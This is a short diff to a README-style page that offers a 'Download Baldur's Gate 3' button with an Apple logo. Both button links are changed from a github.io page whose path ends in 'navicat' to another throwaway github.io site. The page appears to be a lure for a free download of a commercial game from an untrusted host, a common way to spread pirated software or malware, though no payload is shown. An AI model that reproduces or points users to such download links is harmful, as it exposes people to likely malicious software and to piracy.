@@ -5,7 +5,7 @@
 </div>
 
 <div align="center">
-<a href="https://junimata-orex.github.io/.github/navicat">
+<a href="https://baldurs-gate-3.github.io/.github">
 <img src="https://img.shields.io/badge/⬇️_Download_Baldurs_Gate_3-8B0000?style=for-the-badge&logo=apple&logoColor=white" alt="Download Baldur's Gate 3">
 </a>
 </div>
@@ -85,7 +85,7 @@ Play together with friends and share the experience of exploring the world of **
 ## Download Baldur’s Gate 3
 
 <div align="center">
-  <a href="https://junimata-orex.github.io/.github/navicat">
+  <a href="https://baldurs-gate-3.github.io/.github">
     <img src="https://img.shields.io/badge/⬇️_Download_Baldurs_Gate_3-4CAF50?style=for-the-badge&logo=apple&logoColor=white" alt="Download Baldur's Gate 3">
   </a>
 </div>
